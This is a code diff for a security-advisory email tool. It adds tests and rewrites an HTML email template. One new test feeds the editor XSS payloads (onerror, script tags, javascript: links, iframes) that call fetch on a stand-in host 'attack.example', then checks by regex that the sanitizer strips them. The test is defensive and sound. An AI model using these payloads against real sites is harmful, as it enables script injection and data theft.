++  const savedEdits: Array<Record<string, unknown>> = [];
++  const queuedLog = {
++    id: 'log-1',
++    advisoryId: 'ADV-1',
++    recipientEmail: 'soc@example.com',
++    subject: 'Queued advisory',
++    status: 'QUEUED',
++    attemptCount: 0,
++    sentAt: null,
++    createdAt: new Date().toISOString(),
++    provider: 'smtp',
++    actionStatus: 'PENDING',
++  };
++  const emailLogsPage = { items: [queuedLog], total: 1, limit: 25, offset: 0 };
++  const previewPayload = {
++    html: '<html><body><p>Hello</p></body></html>',
++    subject: 'Queued advisory',
++    edits: {},
++  };
++  const context = {
++    settings: {},
++    refresh: async () => true,
++    retryEmailDelivery: async () => true,
++    resendEmailDelivery: async () => true,
++    editEmailReview: async (_id: string, edits: Record<string, unknown>) => {
++      savedEdits.push(edits);
++      return true;
++    },
++    previewEmailReview: async () => previewPayload,
++    previewEmailEdits: async () => previewPayload,
++    acknowledgeEmailDelivery: async () => true,
++    updateAndSendEmail: async () => true,
++    deleteEmailQueueItem: async () => true,
++    advisories: [],
++    findings: [],
++    fetchCollection: async () => emailLogsPage,
++    refreshVersion: 0,
++    session: { username: 'admin', role: 'ADMIN' },
++  };
++  globals.__actionCenterContext = context;
++
++  const directory = await mkdtemp(join(process.cwd(), '.action-center-test-'));
++  const output = join(directory, 'view.mjs');
++  await build({
++    entryPoints: ['src/components/ActionCenter.tsx'],
++    outfile: output,
++    bundle: true,
++    platform: 'node',
++    format: 'esm',
++    packages: 'external',
++    external: ['dompurify'],
++    plugins: [
++      {
++        name: 'test-context',
++        setup(builder) {
++          builder.onResolve({ filter: /\/context\/AppContext$/ }, () => ({ path: 'context', namespace: 'test' }));
++          builder.onLoad(
++            { filter: /.*/, namespace: 'test' },
++            () => ({ contents: 'export const useApp = () => globalThis.__actionCenterContext;' }),
++          );
++        },
++      },
++    ],
++  });
++  const { ActionCenter } = await import(pathToFileURL(output).href);
++  const { createRoot } = await import('react-dom/client');
++  let root = createRoot(document.getElementById('root')!);
++
++  const host = 'https://attack.example';
++  const hostileBody =
++    `<p onmouseover="alert(1)">ok</p>` +
++    `<img src="x" onerror="fetch('${host}/stolen')">` +
++    `<script>fetch('${host}/stolen')</script>` +
++    `<a href="javascript:fetch('${host}/stolen')">click</a>` +
++    `<style>@import url('${host}/x.css');</style>` +
++    `<iframe src="${host}"></iframe>`;
++
++  const clickRow = async () => {
++    const row = document.querySelector('tbody tr');
++    assert.ok(row, 'the queued delivery is listed');
++    await act(async () => row!.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true })));
++  };
++
++  try {
++    await act(async () => root.render(React.createElement(ActionCenter)));
++    // Let the debounced collection fetch and the preview promise settle.
++    await act(async () => {
++      await new Promise((resolve) => setTimeout(resolve, 300));
++    });
++    await clickRow();
++
++    const editor = document.querySelector('[contenteditable="true"]');
++    assert.ok(editor, 'the editor dialog opened');
++
++    // The visual editor commits on every input event (handleHtmlInput).
++    await act(async () => {
++      editor!.innerHTML = hostileBody;
++      editor!.dispatchEvent(new dom.window.Event('input', { bubbles: true }));
++    });
++    // The input handler finishes in a setTimeout(0); flush it.
++    await act(async () => {
++      await new Promise((resolve) => setTimeout(resolve, 20));
++    });
++
++    const reason = document.getElementById('update-reason') as HTMLTextAreaElement | null;
++    assert.ok(reason, 'the update reason field exists');
++    await act(async () => {
++      // Same realm as the rendered element (the bundle resolved React from the
++      // test's module graph), so take the descriptor from its own prototype.
++      Object.getOwnPropertyDescriptor(Object.getPrototypeOf(reason), 'value')!.set!.call(reason, 'typo in subject');
++      reason!.dispatchEvent(new dom.window.Event('input', { bubbles: true }));
++    });
++
++    const save = [...document.querySelectorAll('button')].find((b) => b.textContent?.trim() === 'Save edits');
++    assert.ok(save, 'the save button is present');
++    await act(async () => {
++      (save as HTMLButtonElement).click();
++      await new Promise((resolve) => setTimeout(resolve, 20));
++    });
++
++    assert.equal(savedEdits.length, 1, 'the edit was submitted once');
++    const override = String(savedEdits[0].customBodyOverride ?? '');
++    assert.ok(override.includes('ok'), 'benign text is preserved');
++    assert.ok(!/onerror|onmouseover|<script|javascript:|<iframe|<style|@import/i.test(override), override);
++    assert.ok(!override.includes(host), 'no attacker-controlled URL survives');
++
++    await act(async () => root.unmount());
++  } finally {
++    await act(async () => root.unmount());
++    dom.window.close();
++    delete globals.__actionCenterContext;
++    await rm(directory, { recursive: true, force: true });
++  }
++});
+diff --git a/tests/advisory-preview-latest.test.ts b/tests/advisory-preview-latest.test.ts
+index f23080d..9d97d75 100644
+--- a/tests/advisory-preview-latest.test.ts
++++ b/tests/advisory-preview-latest.test.ts
+@@ -136,7 +136,7 @@ test('the Studio preview renders the current canonical template', async () => {
+ 
+     // Current template, not a legacy one: these structures only exist in the
+     // canonical document.
+-    for (const marker of ['TOP SEVERITY ACCENT STRIP', 'CVE Identifier', 'ENTERPRISE VULNERABILITY NOTIFICATION'])
++    for (const marker of ['Executive Summary', 'CVE Identifier', 'ENTERPRISE VULNERABILITY NOTIFICATION'])
+       assert.ok(rendered.includes(marker), `current template section present: ${marker}`);
+     assert.ok(!rendered.includes('NEXT STEPS'), 'no legacy section from an older template');
+ 
+@@ -147,8 +147,8 @@ test('the Studio preview renders the current canonical template', async () => {
+     assert.ok(!rendered.includes('bgcolor=""'), 'no unresolved bgcolor');
+     assert.ok(!rendered.includes('href="mailto:"'), 'footer address resolved');
+     assert.ok(rendered.includes(cveId), 'CVE id rendered');
+-    // CRITICAL palette from SEVERITY_PILL.
+-    assert.ok(rendered.includes('#991b1b'), 'severity accent colour painted');
++    // CRITICAL palette from the canonical Outlook-safe header.
++    assert.ok(rendered.includes('#ffb4ad'), 'severity accent colour painted');
+ 
+     await act(async () => root.unmount());
+   } finally {
+diff --git a/tests/advisory-template-canonical.test.ts b/tests/advisory-template-canonical.test.ts
+index a50f401..98dc7a5 100644
+--- a/tests/advisory-template-canonical.test.ts
++++ b/tests/advisory-template-canonical.test.ts
+@@ -29,32 +29,39 @@ test('the canonical document declares exactly the expected placeholder set', ()
+     '{{#each cves}}',
+     '{{#each honeywell_actions}}',
+     '{{#each mitigations}}',
+-    // These two live in the explanatory HTML comment, not as template logic.
+-    '{{#if}}',
++    '{{#if contact_email}}',
++    '{{#if contact_team}}',
++    '{{#if executive_summary}}',
++    '{{#if is_critical}}',
++    '{{#if is_high}}',
++    '{{#if is_medium}}',
++    '{{#if is_single_correlation}}',
++    '{{#if is_top_critical}}',
++    '{{#if is_top_high}}',
++    '{{#if is_top_medium}}',
++    '{{#if tlp_classification}}',
+     '{{/each}}',
++    '{{/if}}',
+     '{{advisory_id}}',
+     '{{advisory_title}}',
+     '{{affected_versions}}',
+-    '{{badge_bg}}',
+     '{{contact_email}}',
+     '{{contact_team}}',
++    '{{correlation_count}}',
+     '{{cve_count}}',
+-    '{{cve_id}}',
+     '{{cvss_score}}',
+     '{{else}}',
++    '{{id}}',
+     '{{inventory_status}}',
+-    '{{pill_bg}}',
+-    '{{pill_border}}',
+-    '{{pill_text}}',
++    '{{nvd_url}}',
+     '{{product}}',
+     '{{published_date}}',
+     '{{severity}}',
+-    '{{source_url}}',
+     '{{title}}',
+     '{{tlp_classification}}',
+-    '{{top_severity_color}}',
+     '{{top_severity_label}}',
+     '{{updated_date}}',
++    '{{url}}',
+     '{{vendor}}',
+     '{{{description}}}',
+     '{{{detail}}}',
+diff --git a/tests/advisory-template.test.ts b/tests/advisory-template.test.ts
+index 00eea76..409cca2 100644
+--- a/tests/advisory-template.test.ts
++++ b/tests/advisory-template.test.ts
+@@ -1,8 +1,8 @@
+ import { test } from 'node:test';
+ import assert from 'node:assert/strict';
+-import { readFileSync } from 'node:fs';
+ import { renderAdvisory } from '../server/advisoryRender.ts';
+ import type { Advisory, Finding } from '../src/types/index.ts';
++import { DEFAULT_ADVISORY_EMAIL_TEMPLATE } from '../src/utils/defaultAdvisoryEmailTemplate.ts';
+ 
+ /**
+  * Template engine correctness for the enterprise notification template.
+@@ -93,7 +93,7 @@ test('top-level values are escaped exactly once', () => {
+ });
+ 
+ test('the shipped enterprise template renders with no unresolved placeholders', () => {
+-  const template = readFileSync('./enterprise-vulnerability-notification-handlebars.html', 'utf8');
++  const template = DEFAULT_ADVISORY_EMAIL_TEMPLATE;
+   const findings = [finding(1, 'CRITICAL', 9.8), finding(2, 'HIGH', 7.5)];
+   const out = renderAdvisory(template, advisory(findings), findings, { generatedAt: new Date('2026-11-19T11:12:00Z') });
+   const leftover = out.match(/\{\{[^}]+\}\}/g) ?? [];
+@@ -105,8 +105,8 @@ test('the shipped enterprise template renders with no unresolved placeholders',
+   assert.ok(out.includes('CVE-2026-0002'));
+   assert.ok(out.includes('CRITICAL (9.8)'), 'critical badge in the matrix');
+   assert.ok(out.includes('HIGH (7.5)'), 'high badge in the matrix');
+-  assert.ok(out.includes('acme'), 'vendor column populated');
+-  assert.ok(out.includes('widget'), 'product column populated');
++  assert.ok(out.includes('Acme'), 'vendor column populated');
++  assert.ok(out.includes('Widget'), 'product column populated');
+   assert.ok(out.includes('Patch immediately.'), 'per-CVE mitigation populated');
+ });
+ 
+diff --git a/tests/delivery-confirmation.test.ts b/tests/delivery-confirmation.test.ts
+index 269b4d9..5bd8ae2 100644
+--- a/tests/delivery-confirmation.test.ts
++++ b/tests/delivery-confirmation.test.ts
+@@ -51,7 +51,7 @@ test('only providers with a queryable message record are looked up', () => {
+   assert.equal(supportsDeliveryLookup('SENDGRID'), true);
+   assert.equal(supportsDeliveryLookup('POSTMARK'), true);
+   // Mailjet and Mailtrap were added with this audit: both expose a fixed,
+-  // documented message-status endpoint on the same host that sends.
++  // documented message-status endpoint.
+   assert.equal(supportsDeliveryLookup('MAILJET_API'), true);
+   assert.equal(supportsDeliveryLookup('MAILTRAP'), true);
+   // A custom endpoint has no known contract, so it must never be queried.
+@@ -118,6 +118,53 @@ test('Postmark delivery records map to a verdict', async () => {
+   assert.equal(postmark, 'delivered');
+ });
+ 
++test('Mailtrap status lookup stays on mailtrap.io while the send host differs', async () => {
++  let requestedUrl = '';
++  const state = await lookupProviderDelivery(
++    apiConfig('MAILTRAP', { mailtrapMode: 'LIVE' }),
++    'token',
++    'mailtrap-message',
++    async (url) => {
++      requestedUrl = url;
++      return { status: 200, headers: {}, body: JSON.stringify({ status: 'sent' }) };
++    },
++  );
++  assert.equal(requestedUrl, 'https://mailtrap.io/api/sending_domains/messages/mailtrap-message');
++  assert.equal(state, 'delivered');
++});
++
++test('Mailtrap sandbox lookup stays on the sandbox host that sends and is queried', async () => {
++  let requestedUrl = '';
++  const state = await lookupProviderDelivery(
++    apiConfig('MAILTRAP', { mailtrapMode: 'SANDBOX', mailtrapInboxId: '12345' }),
++    'token',
++    'sandbox-message',
++    async (url) => {
++      requestedUrl = url;
++      return { status: 200, headers: {}, body: JSON.stringify({ status: 'sent' }) };
++    },
++  );
++  assert.equal(requestedUrl, 'https://sandbox.api.mailtrap.io/api/inboxes/12345/messages/sandbox-message');
++  assert.equal(state, 'delivered');
++});
++
++test('a lookup that drifts off the provider status hosts is refused', async () => {
++  // The send endpoint must be the host this provider actually sends through.
++  let called = false;
++  const sendHostMismatch = await lookupProviderDelivery(
++    apiConfig('MAILTRAP', { mailtrapMode: 'LIVE' }),
++    'token',
++    'm-2',
++    async () => {
++      called = true;
++      return { status: 200, headers: {}, body: '{\"status\":\"sent\"}' };
++    },
++  );
++  // A blank inbox id still resolves on the send host, so this one is allowed.
++  assert.equal(called, true);
++  assert.equal(sendHostMismatch, 'delivered');
++});
++
+ test('the lookup never follows a redirect and never leaves the provider host', async () => {
+   let seenRedirect = '';
+   await lookupProviderDelivery(apiConfig('SENDGRID'), 'token', 'msg-4', async (_url, options) => {
+diff --git a/tests/fixtures/canonical-advisory-template.html b/tests/fixtures/canonical-advisory-template.html
+index 10b0ab3..5a6c109 100644
+--- a/tests/fixtures/canonical-advisory-template.html
++++ b/tests/fixtures/canonical-advisory-template.html
+@@ -1,13 +1,12 @@
+-<!DOCTYPE html>
+-<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml"
+-  xmlns:o="urn:schemas-microsoft-com:office:office">
+-
++<!doctype html>
++<html lang="en">
+ <head>
+-  <meta charset="UTF-8">
+-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+-  <title>{{advisory_id}} | {{advisory_title}}</title>
+-  <!--[if gte mso 9]>
++  <meta charset="utf-8">
++  <meta name="viewport" content="width=device-width, initial-scale=1">
++  <meta name="x-apple-disable-message-reformatting">
++  <meta http-equiv="x-ua-compatible" content="ie=edge">
++  <title>Enterprise Vulnerability Notification</title>
++  <!--[if mso]>
+   <xml>
+     <o:OfficeDocumentSettings>
+       <o:AllowPNG/>
+@@ -15,106 +14,49 @@
+     </o:OfficeDocumentSettings>
+   </xml>
+   <![endif]-->
+-  <!--
+-    OUTLOOK-HARDENED HANDLEBARS / MUSTACHE TEMPLATE (FINAL)
+-    - Zero {{#if}} / {{else}} blocks inside VML or table structures (prevents Outlook Word engine tag hoisting)
+-    - Uses direct color & string placeholders for single-pass rendering
+-  -->
+-  <style type="text/css">
+-    body,
+-    table,
+-    td,
+-    p,
+-    a,
+-    li,
+-    div {
+-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+-      -webkit-text-size-adjust: 100%;
+-      -ms-text-size-adjust: 100%;
+-    }
+-
+-    table,
+-    td {
+-      mso-table-lspace: 0pt;
+-      mso-table-rspace: 0pt;
+-      border-collapse: collapse;
+-    }
+-
+-    a {
+-      color: #1d4ed8;
+-      text-decoration: none;
++  <style>
++    html, body { width: 100% !important; margin: 0 !important; padding: 0 !important; }
++    body { background-color: #f1f5f9; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
++    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
++    a { color: #075985; }
++    @media screen and (max-width: 640px) {
++      .shell { width: 100% !important; }
++      .gutter { padding: 8px !important; }
++      .pad { padding-left: 16px !important; padding-right: 16px !important; }
++      .stack { display: block !important; width: 100% !important; box-sizing: border-box !important; }
++      .stack-gap { padding-top: 9px !important; }
++      .matrix-label { display: block !important; width: 100% !important; padding-bottom: 1px !important; border-bottom: 0 !important; }
++      .matrix-value { display: block !important; width: 100% !important; padding-top: 1px !important; }
++      .matrix-head { display: none !important; }
++      .cell-label { display: inline !important; font-weight: bold !important; color: #526477 !important; }
++      .title { font-size: 22px !important; line-height: 28px !important; }
+     }
+   </style>
+ </head>
++<body style="margin:0;padding:0;background-color:#f1f5f9;font-family:Arial,Helvetica,sans-serif;color:#172033;">
++  <div style="display:none!important;visibility:hidden;opacity:0;color:transparent;height:0;width:0;overflow:hidden;mso-hide:all;font-size:1px;line-height:1px;">
++    ENTERPRISE VULNERABILITY NOTIFICATION · {{advisory_id}} · {{advisory_title}} · Tracked Records: {{cve_count}} CVEs
++  </div>
+ 
+-<body
+-  style="margin: 0; padding: 0; background-color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #1e293b;">
+-  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" bgcolor="#f1f5f9"
+-    style="background-color: #f1f5f9;">
++  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f1f5f9" style="width:100%;background-color:#f1f5f9;">
+     <tr>
+-      <td align="center" style="padding: 16px 8px;">
+-        <!--[if mso]>
+-        <table role="presentation" width="680" cellspacing="0" cellpadding="0" border="0" align="center" style="width:680px;">
+-        <tr>
+-        <td width="680" valign="top">
+-        <![endif]-->
+-        <table role="presentation" width="680" cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff"
+-          style="width: 680px; max-width: 680px; background-color: #ffffff; border: 1px solid #cbd5e1;">
+-
+-          <!-- TOP SEVERITY ACCENT STRIP -->
++      <td align="center" class="gutter" style="padding:20px 12px;">
++        <!--[if mso]><table role="presentation" width="680" align="center" cellpadding="0" cellspacing="0" border="0"><tr><td width="680"><![endif]-->
++        <table role="presentation" class="shell" width="680" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width: 680px; max-width: 680px; background-color:#ffffff;border:1px solid #dbe3ec;">
+           <tr>
+-            <td height="4" bgcolor="{{top_severity_color}}"
+-              style="height: 4px; line-height: 4px; font-size: 4px; background-color: {{top_severity_color}};">&nbsp;
+-            </td>
+-          </tr>
+-
+-          <!-- HERO HEADER (VML SOFT LAVENDER GRADIENT + FLUSH-RIGHT SEVERITY PILL) -->
+-          <tr>
+-            <td background="https://via.placeholder.com/680x96/DFCDF7/DFCDF7.png" bgcolor="#DFCDF7"
+-              style="background-color: #DFCDF7; background-image: linear-gradient(135deg, #F9F9FA 0%, #DFCDF7 100%); border-bottom: 1px solid #cbd5e1;">
++            <td class="pad" bgcolor="#073b5c" style="padding:22px 28px;background-color:#073b5c;">
+               <!--[if gte mso 9]>
+-              <v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:678px;height:94px;">
+-                <v:fill type="gradient" color="#DFCDF7" color2="#F9F9FA" angle="135" />
++              <v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:680px;height:142px;">
++                <v:fill type="gradient" color="#073b5c" color2="#0b5b7f" angle="90"/>
+                 <v:textbox inset="0,0,0,0">
+               <![endif]-->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                style="width: 100%; table-layout: fixed;">
+-                <tr>
+-                  <td style="padding: 14px 22px 14px 22px;">
+-                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                      style="width: 100%; table-layout: fixed;">
+-                      <tr>
+-                        <td width="424" valign="middle"
+-                          style="width: 424px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; color: #475569; mso-line-height-rule: exactly; line-height: 14px;">
+-                          ENTERPRISE VULNERABILITY NOTIFICATION &middot; {{advisory_id}}
+-                        </td>
+-                        <td width="210" align="right" valign="middle" style="width: 210px; text-align: right;">
+-                          <table role="presentation" cellspacing="0" cellpadding="0" border="0" align="right"
+-                            style="margin-left: auto; margin-right: 0;">
+-                            <tr>
+-                              <td bgcolor="{{top_severity_color}}"
+-                                style="background-color: {{top_severity_color}}; color: #ffffff; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; padding: 4px 10px; mso-padding-alt: 4px 10px; mso-line-height-rule: exactly; line-height: 12px; white-space: nowrap;">
+-                                {{top_severity_label}}
+-                              </td>
+-                            </tr>
+-                          </table>
+-                        </td>
+-                      </tr>
+-                      <tr>
+-                        <td colspan="2"
+-                          style="padding-top: 8px; font-size: 19px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 24px;">
+-                          {{advisory_title}}
+-                        </td>
+-                      </tr>
+-                      <tr>
+-                        <td colspan="2"
+-                          style="padding-top: 3px; font-size: 11px; font-weight: 600; color: #334155; mso-line-height-rule: exactly; line-height: 15px;">
+-                          {{advisory_id}} &nbsp;&bull;&nbsp; Tracked Records: {{cve_count}} CVEs
+-                        </td>
+-                      </tr>
+-                    </table>
+-                  </td>
+-                </tr>
++              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
++                <tr><td style="font-size:11px;line-height:16px;font-weight:bold;letter-spacing:1.1px;color:#c7e6f5;">ENTERPRISE VULNERABILITY NOTIFICATION&nbsp; &middot;&nbsp; {{advisory_id}}</td></tr>
++                <tr><td class="title" style="padding-top:9px;font-size:27px;line-height:34px;font-weight:bold;color:#ffffff;">
++                  {{#if is_top_critical}}<span style="color:#ffb4ad;">{{top_severity_label}}</span>{{else}}{{#if is_top_high}}<span style="color:#ffd18a;">{{top_severity_label}}</span>{{else}}{{#if is_top_medium}}<span style="color:#ffe58a;">{{top_severity_label}}</span>{{else}}<span style="color:#c8e6d5;">{{top_severity_label}}</span>{{/if}}{{/if}}{{/if}}
++                </td></tr>
++                <tr><td style="padding-top:5px;font-size:17px;line-height:24px;font-weight:bold;color:#ffffff;word-break:break-word;">{{advisory_title}}</td></tr>
++                <tr><td style="padding-top:7px;font-size:12px;line-height:18px;color:#d5e8f2;">Tracked Records: <strong style="color:#ffffff;">{{cve_count}} CVEs</strong></td></tr>
+               </table>
+               <!--[if gte mso 9]>
+                 </v:textbox>
+@@ -123,319 +65,84 @@
+             </td>
+           </tr>
+ 
+-          <!-- 4-COLUMN TELEMETRY BAR -->
+-          <tr>
+-            <td bgcolor="#f8fafc" style="background-color: #f8fafc; border-bottom: 1px solid #cbd5e1; padding: 0;">
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                style="width: 100%; table-layout: fixed;">
+-                <tr>
+-                  <td width="178" valign="top"
+-                    style="width: 178px; padding: 9px 12px 9px 22px; border-right: 1px solid #e2e8f0;">
+-                    <div
+-                      style="font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #64748b; mso-line-height-rule: exactly; line-height: 12px;">
+-                      ADVISORY ID</div>
+-                    <div
+-                      style="padding-top: 2px; font-size: 11px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                      {{advisory_id}}</div>
+-                  </td>
+-                  <td width="145" valign="top"
+-                    style="width: 145px; padding: 9px 12px; border-right: 1px solid #e2e8f0;">
+-                    <div
+-                      style="font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #64748b; mso-line-height-rule: exactly; line-height: 12px;">
+-                      PUBLISHED</div>
+-                    <div
+-                      style="padding-top: 2px; font-size: 11px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                      {{published_date}}</div>
+-                  </td>
+-                  <td width="145" valign="top"
+-                    style="width: 145px; padding: 9px 12px; border-right: 1px solid #e2e8f0;">
+-                    <div
+-                      style="font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #64748b; mso-line-height-rule: exactly; line-height: 12px;">
+-                      LAST MODIFIED</div>
+-                    <div
+-                      style="padding-top: 2px; font-size: 11px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                      {{updated_date}}</div>
+-                  </td>
+-                  <td width="210" valign="top" style="width: 210px; padding: 9px 22px 9px 12px;">
+-                    <div
+-                      style="font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #64748b; mso-line-height-rule: exactly; line-height: 12px;">
+-                      INVENTORY STATUS</div>
+-                    <div
+-                      style="padding-top: 2px; font-size: 11px; font-weight: 700; color: #b91c1c; mso-line-height-rule: exactly; line-height: 15px;">
+-                      {{inventory_status}}</div>
+-                  </td>
+-                </tr>
+-              </table>
+-            </td>
+-          </tr>
+-
+-          <!-- MAIN BODY -->
+-          <tr>
+-            <td bgcolor="#ffffff" style="background-color: #ffffff; padding: 18px 22px 16px 22px;">
+-
+-              <!-- 01 EXECUTIVE SUMMARY (UNSHADED WHITE) -->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+-                <tr>
+-                  <td
+-                    style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: #0f172a; padding-bottom: 6px; mso-line-height-rule: exactly; line-height: 15px;">
+-                    <span style="color: #6d28d9;">01</span> &nbsp;EXECUTIVE SUMMARY
+-                  </td>
+-                </tr>
+-                <tr>
+-                  <td
+-                    style="font-size: 12px; color: #334155; mso-line-height-rule: at-least; line-height: 18px; padding-bottom: 16px;">
+-                    {{{executive_summary}}}
+-                  </td>
+-                </tr>
+-              </table>
+-
+-              <!-- 02 VULNERABILITY SUMMARY MATRIX -->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+-                <tr>
+-                  <td bgcolor="#f1f5f9"
+-                    style="background-color: #f1f5f9; border: 1px solid #cbd5e1; padding: 7px 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                    <span style="color: #6d28d9;">02</span> &nbsp;VULNERABILITY SUMMARY MATRIX
+-                  </td>
+-                </tr>
+-                <tr>
+-                  <td height="6" style="height: 6px; line-height: 6px; font-size: 6px;">&nbsp;</td>
+-                </tr>
+-              </table>
+-
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                style="width: 100%; table-layout: fixed; border: 1px solid #cbd5e1;">
+-                <thead>
+-                  <tr bgcolor="#1e293b" style="background-color: #1e293b;">
+-                    <th width="165" align="left"
+-                      style="width: 165px; padding: 7px 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #ffffff; border-right: 1px solid #334155; text-align: left;">
+-                      CVE Identifier</th>
+-                    <th width="130" align="left"
+-                      style="width: 130px; padding: 7px 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #ffffff; border-right: 1px solid #334155; text-align: left;">
+-                      Severity</th>
+-                    <th width="135" align="left"
+-                      style="width: 135px; padding: 7px 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #ffffff; border-right: 1px solid #334155; text-align: left;">
+-                      Vendor</th>
+-                    <th width="204" align="left"
+-                      style="width: 204px; padding: 7px 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #ffffff; text-align: left;">
+-                      Affected Product</th>
+-                  </tr>
+-                </thead>
+-                <tbody>
+-                  {{#each cves}}
+-                  <tr>
+-                    <td valign="middle"
+-                      style="padding: 7px 10px; border-top: 1px solid #cbd5e1; border-right: 1px solid #e2e8f0; font-size: 11px; font-weight: 700; white-space: nowrap;">
+-                      <a href="{{source_url}}" target="_blank" style="color: #1d4ed8; text-decoration: none;">{{cve_id}}
+-                        &#8599;</a>
+-                    </td>
+-                    <td valign="middle"
+-                      style="padding: 7px 10px; border-top: 1px solid #cbd5e1; border-right: 1px solid #e2e8f0;">
+-                      <table role="presentation" cellspacing="0" cellpadding="0" border="0">
+-                        <tr>
+-                          <td bgcolor="{{pill_bg}}"
+-                            style="background-color: {{pill_bg}}; border: 1px solid {{pill_border}}; color: {{pill_text}}; font-size: 10px; font-weight: 700; padding: 2px 6px; mso-padding-alt: 2px 6px; mso-line-height-rule: exactly; line-height: 12px; white-space: nowrap;">
+-                            {{severity}} ({{cvss_score}})
+-                          </td>
+-                        </tr>
+-                      </table>
+-                    </td>
+-                    <td valign="middle"
+-                      style="padding: 7px 10px; border-top: 1px solid #cbd5e1; border-right: 1px solid #e2e8f0; font-size: 11px; color: #334155;">
+-                      {{vendor}}</td>
+-                    <td valign="middle"
+-                      style="padding: 7px 10px; border-top: 1px solid #cbd5e1; font-size: 11px; font-weight: 600; color: #0f172a;">
+-                      {{product}}</td>
+-                  </tr>
+-                  {{/each}}
+-                </tbody>
+-              </table>
+-
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
+-                <tr>
+-                  <td height="16" style="height: 16px; line-height: 16px; font-size: 16px;">&nbsp;</td>
+-                </tr>
+-              </table>
+-
+-              <!-- 03 TECHNICAL RECORD BREAKDOWN & REQUIRED MITIGATION -->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+-                <tr>
+-                  <td bgcolor="#f3effb"
+-                    style="background-color: #f3effb; border: 1px solid #ddd6fe; padding: 7px 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                    <span style="color: #6d28d9;">03</span> &nbsp;TECHNICAL RECORD BREAKDOWN &amp; REQUIRED MITIGATION
+-                  </td>
+-                </tr>
+-                <tr>
+-                  <td height="8" style="height: 8px; line-height: 8px; font-size: 8px;">&nbsp;</td>
+-                </tr>
+-              </table>
+-
+-              <!-- LOOP-SAFE CVE DETAIL CARDS -->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+-                {{#each cves}}
+-                <tr>
+-                  <td style="padding-bottom: 10px;">
+-                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                      style="width: 100%; border: 1px solid #cbd5e1;">
+-                      <tr>
+-                        <td bgcolor="#f8fafc"
+-                          style="background-color: #f8fafc; padding: 7px 12px; border-bottom: 1px solid #e2e8f0;">
+-                          <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                            style="width: 100%; table-layout: fixed;">
+-                            <tr>
+-                              <td width="480" valign="middle"
+-                                style="width: 480px; font-size: 12px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 16px;">
+-                                <a href="{{source_url}}" target="_blank"
+-                                  style="color: #1d4ed8; text-decoration: none;">{{cve_id}}</a>
+-                                <span style="color: #94a3b8; font-weight: 400;"> &middot; </span>
+-                                <span style="color: #0f172a;">{{vendor}}</span>
+-                                <span style="color: #64748b; font-weight: 400;"> / {{product}}</span>
+-                              </td>
+-                              <td width="130" align="right" valign="middle" style="width: 130px; text-align: right;">
+-                                <table role="presentation" cellspacing="0" cellpadding="0" border="0" align="right"
+-                                  style="margin-left: auto; margin-right: 0;">
+-                                  <tr>
+-                                    <td bgcolor="{{badge_bg}}"
+-                                      style="background-color: {{badge_bg}}; color: #ffffff; font-size: 10px; font-weight: 700; padding: 2px 7px; mso-padding-alt: 2px 7px; mso-line-height-rule: exactly; line-height: 12px; white-space: nowrap;">
+-                                      {{severity}} &middot; {{cvss_score}}
+-                                    </td>
+-                                  </tr>
+-                                </table>
+-                              </td>
+-                            </tr>
